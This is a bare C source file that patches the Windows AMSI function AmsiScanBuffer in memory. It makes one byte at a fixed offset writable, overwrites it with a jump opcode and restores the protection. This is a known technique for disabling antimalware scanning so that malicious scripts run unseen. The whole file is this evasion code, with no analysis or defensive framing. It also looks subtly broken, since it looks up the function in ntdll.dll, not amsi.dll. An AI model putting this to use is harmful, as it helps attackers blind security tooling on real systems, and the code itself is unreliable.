#include <windows.h>

int main() {
	DWORD dwOld = 0;
	DWORD offset = 83;
	FARPROC ptrAmsiScanBuffer = GetProcAddress(LoadLibrary("ntdll.dll"), "AmsiScanBuffer");
	VirtualProtect(ptrAmsiScanBuffer + offset, 1, PAGE_EXECUTE_READWRITE, &dwOld);
	memcpy(ptrAmsiScanBuffer + offset, "\x74", 1);
	VirtualProtect(ptrAmsiScanBuffer + offset, 1, dwOld, &dwOld);
	return 0;
}
